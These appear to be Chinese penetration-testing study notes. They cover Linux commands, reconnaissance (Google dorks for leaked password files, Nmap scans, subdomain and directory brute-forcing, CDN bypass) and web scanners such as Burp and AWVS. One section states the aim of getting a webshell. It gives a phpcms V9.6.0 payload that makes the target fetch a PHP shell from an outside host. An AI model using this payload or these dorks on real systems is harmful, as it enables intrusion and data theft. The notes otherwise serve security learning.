<p>​    date命令用于显示及设置系统的时间或日，格式为“date [] [+指定的格式]”。</p>
<p>poweroff命令：</p>
<p>​    poweroff命令用于关闭系统，其格式为poweroff。</p>
<p>top命令：</p>
<p>​    显示当前系统正在执行的进程的相关信息，包括进程ID、内存占用率等，格式为“top [参数]”。</p>
<p>​    ifconfig命令：</p>
<p>​       用于获取网卡配置与网络状态等信息，格式为“ifconfig [网络设备] [参数]”</p>
<p>​    uname命令：</p>
<p>​       用于查看系统内核与系统版本等信息，格式为“uname [-a]“</p>
<p>​    who命令：</p>
<p>​       用于查看当前登入主机的用户终端信息，格式为“who [参数]“</p>
<p>​    history命令：</p>
<p>​       用于显示历史执行过的命令就，格式为“history [数值]“</p>
<p>​    pwd命令：</p>
<p>​       用于显示用户当前所处的工作目录，格式为“pwd [选项]“</p>
<p>​    cat命令：</p>
<p>​       用于查看纯文本文件（内容较少的），格式为“cat [选项] [文件]”</p>
<p>​    more命令：</p>
<p>​       用于查看纯文本文件（内容较多的），格式为“more [选项]文件”</p>
<p>​    head命令：</p>
<p>​       用于查看纯文本文档的前N行，格式为“head [选项] [文件]”</p>
<p>​    wc命令：</p>
<p>​       用于统计指定文本的行数、字数、字节数，格式为“wc [选项] 文本”</p>
<p>​    stat命令：</p>
<p>​       用于查看文件的具体存储信息和时间等信息，格式为“stat 文件名称”</p>
<p>​    touch命令：</p>
<p>​       用于创建空白文件或设置文件的时间，格式为“touch [选项] [文件]”</p>
<p>​    mkdir命令：</p>
<p>​       用于创建空白的目录，格式为“mkdir [选项] 目录”</p>
<p>​    mv命令：</p>
<p>​       用于移动文件或将文件重命名，格式为“mv [选项] 源文件 [目标路径|目标文件名]”</p>
<p>​    file命令：</p>
<p>​       用于查看文件的类型，格式为“file 文件名”</p>
<p>——使用chmod命令进行文件的权限修改</p>
<p>​    chmod [选项] &lt;模式，模式…&gt; &lt;文件名…&gt;</p>
<p>​    文件和目录的权限：linux的文件和目录的权限有所不同。</p>
<p>​    文件的权限：</p>
<p>​    r 读文件   数值为4</p>
<p>​    w 写文件  数值为2</p>
<p>​    x 执行文件 数值为1</p>
<p>​    目录的权限：</p>
<p>​    x r 可以读取（cp）和查看（ls）目录的内容（即文件和目录），同时还需要可执行权限。</p>
<p>​    x w 可以在目录里创建文件（touch）与目录（mkdir）还有删除文件（rm）与目录（rmdir），同时还需要可执行权限。</p>
<p>​    x x 可以进入目录（cd）和执行文件 实践过程</p>
<p>Linux文件权限和目录配置：<a target="_blank" rel="noopener" href="http://cn.linux.vbird.org/linux_basic/0210filepermission.php">http://cn.linux.vbird.org/linux_basic/0210filepermission.php</a></p>
<p>用户管理：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xd502djj/archive/2011/11/23/2260094.html">https://www.cnblogs.com/xd502djj/archive/2011/11/23/2260094.html</a></p>
<p>github项目克隆到本地：git clone [github克隆链接]</p>
<p>——查看用户信息：cat /etc/passwd</p>
<p>​    添加用户：useradd -m 用户名  自动在home文件夹下创建用户名的目录。</p>
<p>​             useradd -g 组名 用户名    指定添加在某个组里。</p>
<p>​             passwd 用户名     修改key的新密码</p>
<p>​    删除用户：userdel -r 用户名    删除目录以及用户</p>
<p>​    查看用户组信息：cat /etc/group</p>
<p>​    查看用户组归属：groups 用户名</p>
<p>​    添加组：usermod -g 组名 用户名</p>
<p>​            usermod -a-G 组名 用户名</p>
<p>​    删除组：groupdel 组名</p>
<p>​    设置权限：chmod 777 文件名     给当前文件设置为777权限</p>
<p>​             chmod -R 777目录名    给当前目录递归权限为777</p>
<p>​    小游戏：<a target="_blank" rel="noopener" href="https://linuxz.github.io/tianyizone/linux-chmod-permissions.html">https://linuxz.github.io/tianyizone/linux-chmod-permissions.html</a></p>
<p>——软件安装管理</p>
<p>​    dpkg：dpkg是一个Debian的一个命令行工具，它可以用来安装、删除、构建和管理Debian的软件包。</p>
<p>​           安装软件：dpkg -I xxx.deb</p>
<p>​           卸载软件：dpkg -r xxx.deb 删除软件包</p>
<p>​                    dpkg -r –purge xxx.deb  连同配置文件一起删除</p>
<p>​    gdebi：gdebi是一个轻量级的deb安装工具，它能代替臃肿的ubuntu软件中心安装deb.</p>
<p>​           安装gdebi：sudo apt-get update</p>
<p>​                      sudo apt-get install gdebi</p>
<p>​           安装软件：sudo gdebi xxx.deb</p>
<p>​                     图形化安装</p>
<p>——搜索命令：find命令 所查找的目录路径</p>
<p>​              find  ./kali/ -print 指定目录查找并输出</p>
<p>​              find ./kali/ -exec ls () ; 指定目录以shell脚本运行并输出</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/WX_East/article/details/68530883">https://blog.csdn.net/WX_East/article/details/68530883</a></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="信息收集什么"><a href="#信息收集什么" class="headerlink" title="信息收集什么"></a>信息收集什么</h2><p>目标人物：电话、邮箱、密码、whois……. <a target="_blank" rel="noopener" href="http://tool.chinaz.com/">http://tool.chinaz.com/</a></p>
<p>目标环境：域名、脚本语言、数据库、中间件、框架、cms、开放端口……</p>
<p>目标事件：历史漏洞、使用手册、使用说明、通知、公众号……</p>
<p>社工密码字典在线生成：<a target="_blank" rel="noopener" href="https://api.xiaobaibk.com/lab/guess/">https://api.xiaobaibk.com/lab/guess/</a></p>
<h2 id="信息收集能干嘛"><a href="#信息收集能干嘛" class="headerlink" title="信息收集能干嘛"></a>信息收集能干嘛</h2><p>例子1：cms可能存在通杀漏洞，如果使用了CMS建站我们可以用通杀漏洞直接攻击。</p>
<p>例子2：有些危险端口开放了我们就可以尝试入侵，例如445|3306|22|1433|6379可以尝试爆破或者使用某些端口存在漏洞的服务。而且有可能一台服务器上面不同端口代表不同的web网站。</p>
<h2 id="信息收集报告编写"><a href="#信息收集报告编写" class="headerlink" title="信息收集报告编写"></a>信息收集报告编写</h2><p>记录收集到的信息</p>
<p>目标人物：电话、邮箱、密码、whois……. </p>
<p>目标环境：域名、脚本语言、数据库、中间件、框架、cms、开放端口……</p>
<p>目标事件：历史漏洞、使用手册、使用说明、通知、公众号、手机app……</p>
<h2 id="谷歌语法Google-hacking"><a href="#谷歌语法Google-hacking" class="headerlink" title="谷歌语法Google hacking"></a>谷歌语法Google hacking</h2><p>——传统的搜索引擎能够有效抓取对方网站页面内容</p>
<p>\1.  公司动态；2.组织文档；3.用户名/密码；4.测试文件；5.历史数据</p>
<p>——常见的谷歌语法帮助我们缩小目标搜索范围</p>
<p>site：搜索范围限制在某网站或顶级域名中。</p>
<p>inurl：当我们用inurl进行查询的时候，google会返回哪些在URL（网址）里边包含了我们查询关键词的网页。</p>
<p>intext：当我们用intext进行查询的时候，google会返回那些在文本正文里边包含了我们查询关键词的网页。</p>
<p>intitle：当我们用intitle进行查询的时候，google会返回哪些网页标题为查询结果。</p>
<p>google镜像：<a target="_blank" rel="noopener" href="https://www.ggjxz.top/">https://www.ggjxz.top/</a></p>
<p>​              <a target="_blank" rel="noopener" href="https://gg456.top/">https://gg456.top/</a></p>
<p>​              <a target="_blank" rel="noopener" href="http://tools.bugscaner.com/google/">http://tools.bugscaner.com/google/</a></p>
<p><a target="_blank" rel="noopener" href="https://go-xyz.xyz/">https://go-xyz.xyz/</a></p>
<p>google语法例子：</p>
<p>​    intitle:”netbotz appliance” “ok”</p>
<p>​    inurl: /admin/login.php</p>
<p>inur:qq.txt</p>
<p>filetype:xls “username | password”</p>
<p>intext:password “Login Info” filetype:txt</p>
<p>扩展思路：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p>
<p><a target="_blank" rel="noopener" href="https://www.baidu.com/robots.txt">https://www.baidu.com/robots.txt</a> 爬虫协议</p>
<h2 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h2><p>——基于物联网搜索，搜索联网的网络设备</p>
<p>钟馗之眼：<a target="_blank" rel="noopener" href="http://www.zoomeye.org/">http://www.zoomeye.org</a>    傻蛋：<a target="_blank" rel="noopener" href="https://www.oshadan.com/">https://www.oshadan.com</a></p>
<p>Shodan：<a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io</a>       Dnsdb：<a target="_blank" rel="noopener" href="https://www.dnsdb.io/zh-cn/">https://www.dnsdb.io/zh-cn/</a></p>
<p>fofa：<a target="_blank" rel="noopener" href="https://fofa.so/">https://fofa.so</a></p>
<h2 id="端口扫描-Nmap"><a href="#端口扫描-Nmap" class="headerlink" title="端口扫描-Nmap"></a>端口扫描-Nmap</h2><p>——功能：</p>
<p>1.检测存活在网络上的主机（主机发现）</p>
<p>\2.  检测主机上开放的端口（端口发现或枚举）</p>
<p>\3.  检测到相应的端口（服务发现）的软件和版本</p>
<p>\4.  检测操作系统，硬件地址，以及软件版本</p>
<p>\5.  检测脆弱性的漏洞（Nmap的脚本）</p>
<p>——常用的端口扫描指令</p>
<p>​    -sS：TCP SYN扫描</p>
<p>​    -p：指定端口号扫描</p>
<p>​    -v：显示扫描过程</p>
<p>​    -F：快速扫描</p>
<p>​    -Pn：禁止ping后扫描：跳过主机发现的过程进行端口扫描</p>
<p>​    -A：全面的系统扫描：包括打开操作系统探测、版本探测、脚本扫描</p>
<p>—扫描指定ip开放端口</p>
<p>​    命令：nmap -sS -p 端口号 -v 192.168.1.2</p>
<p>​    使用半开扫描，指定端口号1-65535，显示扫描过程</p>
<p>—穿透防火墙扫描</p>
<p>​    命令：nmap -Pn -A 192.168.1.2</p>
<p>​    服务器禁止ping命令，试试-Pn，nmap参数配合使用</p>
<p>​    -sU：UDP扫描                         -sT：TCP扫描</p>
<p>​    -sV：扫描系统和程序版本号检测          –script=vuln：全面的漏洞扫描</p>
<p>​    -n：禁止反向域名解析                   -R：反向域名解析</p>
<p>​    -6：启用IPV6扫描</p>
<p>​    —漏洞扫描</p>
<p>​    nmap -script=vuln 192.168.1.2</p>
<p>​    使用vuln脚本进行全面的漏洞扫描</p>
<p>​    信息安全漏洞门户：<a target="_blank" rel="noopener" href="http://cve.scap.org.cn/">http://cve.scap.org.cn/</a></p>
<p>​                     <a target="_blank" rel="noopener" href="https://cve.mitre.org/">https://cve.mitre.org/</a></p>
<p>—指纹识别扫描</p>
<p>​    nmap -sV -v 192.168.1.2</p>
<p>​    扫描系统和程序版本号检测，并且输出详细信息。</p>
<p>——端口扫描的状态</p>
<p>​    opened：端口开启                          closed：端口关闭</p>
<p>​    Filtered：端口被过滤，数据没有到达主机，返回的结果为空，数据被防火墙</p>
<p>​    Unfiltered：未被过滤，数据有到达主机，但是不能识别端口的当前状态</p>
<p>​    open|filtered：开放或者被过滤，端口没有返回值，主要发生在UDP、IP、FIN、NULL和Xmas扫描中。</p>
<p>​    close|filtered：关闭或者被过滤，只发生在IP ID idle扫描。</p>
<p>——使用Nmap中的脚本进行信息收集</p>
<p>​    —whois信息查询</p>
<p>​    —DNS解析查询</p>
<p>——Nmap中的漏洞脚本扫描</p>
<p>​    Nmap官方脚本：<a target="_blank" rel="noopener" href="https://svn.nmap.org/nmap/scripts/">https://svn.nmap.org/nmap/scripts/</a></p>
<p>​    Nmap中文手册：<a target="_blank" rel="noopener" href="http://www.nmap.com.cn/doc/manual.shtm">http://www.nmap.com.cn/doc/manual.shtm</a></p>
<p>​    Nmap官方手册：<a target="_blank" rel="noopener" href="https://nmap.org/book/man.html">https://nmap.org/book/man.html</a></p>
<p>​    黑客电影：<a target="_blank" rel="noopener" href="https://nmap.org/movies/">https://nmap.org/movies/</a></p>
<p>脚本保存位置：/usr/share/nmap/scripts/</p>
<p>​    —whois信息扫描：nmap –script=whois-domain xxxx.com</p>
<p>—DNS解析爆破扫描：nmap –script=dns-brut xxxx.com</p>
<p>——把Nmap扫描结果保存到本地</p>
<p>​    —标准保存：nmap -oN test.txt xxxx.com</p>
<p>​    把输出结果保存到指定文件</p>
<p>​    —保存为Xml格式：nmap -oX test.xml xxxx.com</p>
<p>​    需要用浏览器打开，查看结果</p>
<h2 id="子域名-amp-目录扫描"><a href="#子域名-amp-目录扫描" class="headerlink" title="子域名&amp;目录扫描"></a>子域名&amp;目录扫描</h2><p>——子域名打开就是404页面，403页面怎么做</p>
<p>​    案例：如何发现ucweb.com的两个XSS</p>
<p>​    <a target="_blank" rel="noopener" href="https://nosec.org/home/detail/2011.html">https://nosec.org/home/detail/2011.html</a></p>
<p>——子域在线收集</p>
<p>\1.  谷歌语法：通过特定站点范围查询子域：sit: xxxx.com</p>
<p>\2.  在线枚举爆破：<a target="_blank" rel="noopener" href="http://phpinfo.me/domain/">http://phpinfo.me/domain/</a></p>
<p>\3.  证书搜索：基于SSL证书查询子域：<a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh/</a></p>
<p>\4.  DNS搜索：基于DNS记录查询子域：<a target="_blank" rel="noopener" href="https://dns.bufferover.run/dns?q=xxx">https://dns.bufferover.run/dns?q=xxx</a></p>
<p>——子域收集-Fuzzdomain工具</p>
<p>​    使用github下载相应的子域发现工具：<a target="_blank" rel="noopener" href="https://github.com/aboul3la/Sublist3r/">https://github.com/aboul3la/Sublist3r/</a></p>
<p>\1.  安装模块：sudo pip install -r requirements.txt</p>
<p>\2.  枚举目标子域：python sublist3r.py -d aqlab.cn</p>
<p>\3.  枚举子域并且显示开放80和443端口的子域</p>
<p>python sublist3r.py -d aqlab.cn -p 80,443</p>
<p>\4.  枚举目标子域并保存：python sublist3r.py -d aqlab.cn -o aqlab.txt</p>
<p>——用户事件</p>
<p>​    通过目标站点的用户事件找到子域以及敏感信息</p>
<p>\1.  历史漏洞</p>
<p>乌云镜像：<a target="_blank" rel="noopener" href="https://www.anquan.us/">https://www.anquan.us/</a></p>
<p>\2.  使用手册，通知</p>
<p>学院通知：<a target="_blank" rel="noopener" href="https://dwz.cn/OOWeYYy6">https://dwz.cn/OOWeYYy6</a></p>
<p>——使用御剑后台扫描工具扫描敏感目录</p>
<p>——robots.txt文件的作用</p>
<p>​    —Robots协议：也称为爬虫协议、机器人协议等。全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。</p>
<p>​    —Robots.txt文件的重要性</p>
<p>​       它是搜索引擎蜘蛛访问网站时要查看的第一个文件，并且会根据robots.txt文件内容来爬行网站。在某种意义上说，它的一个任务就是指导蜘蛛爬行，减少搜索引擎蜘蛛的工作量。</p>
<p>​    —Robots.txt文件的存放位置</p>
<p>​       网站根目录下，通过“域名/robots.txt”能正常访问即可，如http://域名/robots.txt</p>
<p>​       写法：<a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1616368344109675728&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1616368344109675728&amp;wfr=spider&amp;for=pc</a></p>
<p>——目录扫描-dirbuster</p>
<p>​    —文件目录：为实现“按名存取”，必须建立文件名与储存空间中物理地址的对应关系，体现这种对应关系的数据结构称为文件目录。</p>
<p>​    —目录扫描：可以让我们发现这个网站存在多少个目录，多少个页面，探索出网站的整体结构。还能扫描敏感文件，后台文件，数据库文件，和信息泄露文件等等。</p>
<p>​    —常见的目录信息泄露</p>
<p>\1.  目录遍历漏洞：（路径遍历）是由于web服务器或者web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞，使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（web根目录以外的文件），甚至执行系统命令。</p>
<p>—目录遍历漏洞原理：程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。</p>
<p>\2.  敏感信息泄露：由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。</p>
<p>比如：</p>
<p>—通过访问url下的目录，可以直接列出目录下的文件列表；</p>
<p>—输入错误的url参数后报错信息里包括操作系统、中间件、开发语言的版本或其他信息；（sql注入）</p>
<p>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登陆地址、内网接口信息，甚至账号密码等。</p>
<p>​    —常见的源码泄露案例</p>
<p>​       目录遍历：当没有默认网页时，在网站上显示web服务器显示用户列表中的文件和目录。因此，在apachce服务器上默认文件名为index.php，当没有上传index.php时，服务器就会将文件夹中的内容全部展示出来。</p>
<p>​       实例：攻击者浏览目录并访问web应用程序的源代码，备份可能的数据库文件。</p>
<p>​       <a target="_blank" rel="noopener" href="http://www.sohu.com/a/192064346_653604">http://www.sohu.com/a/192064346_653604</a></p>
<p>​    —常见的目录扫描方式</p>
<p>\1.  robots.txt：网站内的robots.txt文件</p>
<p>\2.  目录爆破：御剑 nikto dirbuster webdirscan…</p>
<p>\3.  第三方资源利用：Js SDK</p>
<p>—dirbuster工具说明</p>
<p>​    Owasp项目，它是一个多线程的基于java的应用程序设计用于暴力破解web应用服务器上的目录名和文件名的工具。</p>
<p>​    工作原理：Dirbuster是一种履带式和粗暴式的混合物它遵循找到的页面中的所有链接，为可能的文件尝试不同的名称。这些名称可能位于我们使用的文件类似的文件中，也可能由Dirbuster使用Pure Brute Force选项自动生成，并设置字符集以及生成的单词的最小和最大长度。</p>
<p>​    为确定文件是否存在，dirbuster使用服务器的响应代码。最常见的响应如下所示：</p>
<p>​    200 ok：文件存在      404 找不到404文件：服务器中不存在该文件</p>
<p>​    301 301永久移动       401 Unauthorized：访问此文件需要身份验证</p>
<p>​    403 Forbidden：请求有效但服务器拒绝响应</p>
<p>Dirbuster是用来探测web目录结构和隐藏的敏感文件的</p>
<p>​    —环境配置</p>
<p>​       Dirbuster是基于java的应用程序需要Jre环境</p>
<p>​       Java环境下载：<a target="_blank" rel="noopener" href="https://www.java.com/zh_CN/%EF%BC%88%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%89">https://www.java.com/zh_CN/（加载器）</a></p>
<p>​       安装过程中一定要勾选“add to path”（添加环境变量）</p>
<p>​       Dirbuster下载地址：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/dirbuster/files/">https://sourceforge.net/projects/dirbuster/files/</a></p>
<p>​      安装：windows用户双击Dirbuster.jar启动软件（Linux用户在命令行运行./DirBuster-1.0-RC1.sh，若脚本无执行权限使用chmod +x ./DirBuster-1.0-RC1.sh添加权限）</p>
<p>—操作步骤：1，URL设置；2.线程数设置；3.选择爆破字典；4.取消选择递归查询；5.开始运行。</p>
<p>——安全工具：<a target="_blank" rel="noopener" href="https://habo.qq.com/tool/index">https://habo.qq.com/tool/index</a></p>
<p>——信息安全，黑客工具：<a target="_blank" rel="noopener" href="https://www.ddosi.org/">https://www.ddosi.org/</a></p>
<p>——CMS指纹识别</p>
<p>​    CMS（内容管理系统）（content management system）快速搭建网站</p>
<p>​    web应用框架（web application framework）快速二次开发的web应用框架，例如网站,小程序。</p>
<p>​    —在线和离线的方式收集指纹信息</p>
<p>\1.  云悉在线：<a target="_blank" rel="noopener" href="http://www.yunsee.cn/">http://www.yunsee.cn</a></p>
<p>\2.  whatweb：<a target="_blank" rel="noopener" href="http://www.whatweb.net/">http://www.whatweb.net</a></p>
<p>\3.  插件wappalyzer：<a target="_blank" rel="noopener" href="https://www.wappalyzer.com/">https://www.wappalyzer.com</a></p>
<p>\4.  脚本CMSeek：<a target="_blank" rel="noopener" href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a></p>
<p>Webfinger：<a target="_blank" rel="noopener" href="https://github.com/se55i0n/Webfinger">https://github.com/se55i0n/Webfinger</a></p>
<p>​    —WAF：全称为web application firewall，是一款针对web应用攻击的防护产品。当web应用越来越丰富的同时，大部分交互都转移到了web上，与此同时web也成为了主要的攻击目标，此时waf就成为了安全防护中的第一道防线，waf在安全中的重要性不言而喻。</p>
<p>​    —常见的WAF产品以及检测方法</p>
<p>\1.  Awesome-WAF项目：<a target="_blank" rel="noopener" href="https://github.com/0xInfection/Awesome-WAF">https://github.com/0xInfection/Awesome-WAF</a></p>
<p>\2.  检测脚本：wafw00f：<a target="_blank" rel="noopener" href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>
<p>—CND：全称是content delivery network，即内容分发网络。基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈与环节，使内容传输得更快更稳定。</p>
<p>​    使用在线以及离线的方式检测CDN:</p>
<p>\1.  国内在线-CDN云测：<a target="_blank" rel="noopener" href="http://cdn.chinaz.com/">http://cdn.chinaz.com/</a></p>
<p>\2.  国外在线-cdnplanet：<a target="_blank" rel="noopener" href="https://www.cdnplanet.com/">https://www.cdnplanet.com/</a></p>
<p>\3.  脚本探测-xcdn：<a target="_blank" rel="noopener" href="https://github.com/3xp10it/xcdn">https://github.com/3xp10it/xcdn</a></p>
<p>—常见绕过CDN的方法</p>
<p>​    都是通过寻找对方未绑定CDN站点进行突破，从而找到真实站点。</p>
<p>常见的寻找真实IP的方法：</p>
<p>超级ping：<a target="_blank" rel="noopener" href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p>
<p>历史解析：微步在线：<a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p>
<p>​           历史whois：<a target="_blank" rel="noopener" href="https://www.benmi.com/whoishistory/">https://www.benmi.com/whoishistory/</a></p>
<p>​           历史托管：<a target="_blank" rel="noopener" href="https://toolbar.netcraft.com/site_report?url=">https://toolbar.netcraft.com/site_report?url=</a></p>
<p>内部邮箱：对方发送邮件，查看邮箱来源IP。</p>
<p>二级域名：寻找子域名找到未绑定的CDN站点。</p>
<p>手机APP：使用Burp抓取手机APP数据包。</p>
<p>微信公众号：使用Burp抓取微信公众号数据包。</p>
<p>国外ping：ping.go：<a target="_blank" rel="noopener" href="http://www.ping.ge/">http://www.ping.ge</a></p>
<p>​           海外测速：<a target="_blank" rel="noopener" href="http://tool.chinaz.com/speedworld/">http://tool.chinaz.com/speedworld/</a></p>
<p>网络空间引擎：fofa：<a target="_blank" rel="noopener" href="https://fofa.so/">https://fofa.so</a></p>
<p>CDN漏洞案例：CloudFlare防护下的破绽：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/41533.html">https://www.freebuf.com/articles/web/41533.html</a></p>
<p>某运营商CDN配置系统弱口令：<a target="_blank" rel="noopener" href="http://suo.im/4EavrV">http://suo.im/4EavrV</a></p>
<p>——web综合信息收集</p>
<p>​    —实战信息收集-关于目标网站所有的信息</p>
<p>​       目标站点； 目的：拿到webshell；</p>
<p>脚本语言：php中间件：iis6.0，nginx；cms：phpcms V9.6.0</p>
<p>漏洞利用文章：<a target="_blank" rel="noopener" href="http://blog.nsfocus.net/phpcms-v9-6-getshell-0day-vulnerability-analysis/">http://blog.nsfocus.net/phpcms-v9-6-getshell-0day-vulnerability-analysis/</a></p>
<p>​    —相关工具</p>
<p>​       payload：[siteid=1&amp;modelid=11&amp;username=saesvens1&amp;password=ssevses&amp;mail=<a href="mailto:&#115;&#115;&#x65;&#x76;&#x65;&#x6e;&#x73;&#x73;&#x40;&#113;&#113;&#46;&#x63;&#x6f;&#x6d;">&#115;&#115;&#x65;&#x76;&#x65;&#x6e;&#x73;&#x73;&#x40;&#113;&#113;&#46;&#x63;&#x6f;&#x6d;</a>&amp;info[content]= src=<a target="_blank" rel="noopener" href="http://a-1253363006.cos.ap-chengdu.myqcloud.com/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=">http://a-1253363006.cos.ap-chengdu.myqcloud.com/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</a></p>
<p>​       中国蚁剑：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq1045553189/article/details/87517612">https://blog.csdn.net/qq1045553189/article/details/87517612</a></p>
<p>​       蚁剑目录：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p>
<p>​       加速器：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Loader">https://github.com/AntSwordProject/AntSword-Loader</a></p>
<p>​       蚁剑安装流程：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36235492/article/details/85713821">https://blog.csdn.net/qq_36235492/article/details/85713821</a></p>
<p>​      中国菜刀：<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80/3963062?FR=ALADDIN">https://baike.baidu.com/item/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80/3963062?FR=ALADDIN</a></p>
<p>​       安装hackbar，社区搜索：<a target="_blank" rel="noopener" href="https://bbs.zkaq.cn/t/3750.html">https://bbs.zkaq.cn/t/3750.html</a></p>
<h1 id="Web利用"><a href="#Web利用" class="headerlink" title="Web利用"></a>Web利用</h1><h2 id="Web漏洞扫描工具"><a href="#Web漏洞扫描工具" class="headerlink" title="Web漏洞扫描工具"></a>Web漏洞扫描工具</h2><p>——web漏洞扫描-简介</p>
<p>\1.  漏洞扫描是指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用漏洞的一种安全检测（渗透攻击）行为。</p>
<p>\2.  web漏洞扫描器</p>
<p>针对于web应用程序所开发的漏洞扫描器，例如SQL注入、XSS跨站脚本攻击等常见漏洞，进行主动式扫描探测是否存在漏洞。Web漏洞扫描器之间也有区别，例如对于XSS漏洞测试的扫描器，商业的漏洞扫描器和非商业性的漏洞扫描器。</p>
<p>通过扫描器能够快速的发现漏洞，来提升我们的效率，以及漏洞覆盖面。</p>
<p>web扫描器也是在为我们做信息收集、为接下来的渗透测试做准备。</p>
<p>——AWVS简介</p>
<p>​    Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的web网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。</p>
<p>​    AWVS帮助我们快速发现漏洞并进行输出报告，来提高工作效率。</p>
<p>——AWVS安装：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/chun-xiaolin001/p/10060830.html">https://www.cnblogs.com/chun-xiaolin001/p/10060830.html</a></p>
<h2 id="WEB漏洞扫描器-AppScan"><a href="#WEB漏洞扫描器-AppScan" class="headerlink" title="WEB漏洞扫描器-AppScan"></a>WEB漏洞扫描器-AppScan</h2><p>​    AppScan，即AppScan standard edition。其安装在Windows操作系统上，可以对网站等web应用进行自动化的应用安全扫描和测试。</p>
<p>​    Rational AppScan（简称AppScan）其实是一个产品家族，包括众多的应用安全扫描产品，从开发阶段的源代码扫描的AppScan source edition，到针对web应用进行快速扫描的AppScan standard edition，以及进行安全管理和汇总整合的AppScan enterprise Edition等。</p>
<p>​    我们经常说的AppScan就是指的桌面版本的AppScan，即AppScan standard edition。其实装在windows上，也可以对网站等web应用进行自动化的安全扫描和测试。</p>
<p>​    web扫描器也是在为我们做信息收集、为接下来的渗透测试做准备。</p>
<h2 id="WEB漏洞扫描器-Burp-suite常规测试"><a href="#WEB漏洞扫描器-Burp-suite常规测试" class="headerlink" title="WEB漏洞扫描器-Burp suite常规测试"></a>WEB漏洞扫描器-Burp suite常规测试</h2><p>——简介</p>
<p>​    Burp Suite是一个集成化的渗透测试工具，它集合了多种渗透测试组件，使我们自动化地或手工的完成对web应用的渗透测试和攻击。在渗透测试中，我们使用Burp Suite将使得测试工作变得更加容易和方便，即使在不需要娴熟的技巧的情况下，只要熟悉使用Burp Suite，也使得渗透测试工作变得轻松和高效。</p>
<p>​    Burp Suite是用于攻击web应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了很多接口，以加速攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP消息、持久性、认证、代理、日志、警报。</p>
<p>​    Burp Suite是渗透测试人员在工作中最常用的工具，用来分析数据包进行测试。</p>
<p>——原理</p>
<p>​    浏览器和相关应用程序的中间拦截、修改、重放数据包的代理工具。</p>
<p>——安装配置</p>
<p>\1.  安装JAVA 64位环境：<a target="_blank" rel="noopener" href="https://www.java.com/zh_CN/download/">https://www.java.com/zh_CN/download/</a></p>
<p>\2.  安装jyphon环境jar版本：<a target="_blank" rel="noopener" href="https://www.jython.org/download.html">https://www.jython.org/download.html</a></p>
<p>\3.  安装Jruby环境jar版本：<a target="_blank" rel="noopener" href="https://www.jruby.org/download">https://www.jruby.org/download</a></p>
<p>\4.  设置浏览器代理</p>
<p>\5.  导入HTTPS证书</p>
<p>—常用的模块</p>
<p>\1.  Burp Target；2. Burp Proxy; 3. Burp Intruder; 4. Burp Repeater; 5. Burp Extender</p>
<h2 id="Burpsuite-插件利用检测"><a href="#Burpsuite-插件利用检测" class="headerlink" title="Burpsuite-插件利用检测"></a>Burpsuite-插件利用检测</h2><p>——Sqlmap插件安装</p>
<p>\1.  安装python环境； 2. 安装sqlmap；3. 添加环境变量；4. 下载sqlmap.jar扩展包：<a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1skDVwa5">http://pan.baidu.com/s/1skDVwa5</a> 密码ce5f；5. burp加载插件。</p>
<p>——xss插件安装</p>
<p>\1.  Phantomjs下载：<a target="_blank" rel="noopener" href="http://phantomjs.org/download.html">http://phantomjs.org/download.html</a> 配置环境变量，把bin目录下的exe加入环境变量，文件放在python目录下</p>
<p>\2.  安装xssValidator BApp Store</p>
<p>\3.  下载xss.js下载地址：<a target="_blank" rel="noopener" href="https://github.com/nVisium/xssValidator">https://github.com/nVisium/xssValidator</a></p>
<p>\4.  利用phantomjs运行xss.js C:\xss\phantomjs-2.1.1-windows\bin&gt;phantomjsxss.js</p>
<p>——xss插件和Burp使用</p>
<p>\1.  配置插件；2. 抓包发送到Intruder；3. 配置payloads为xssValidator；4. 配置Intruder option的grep -match；5. 开始</p>
<p>——开源的插件项目</p>
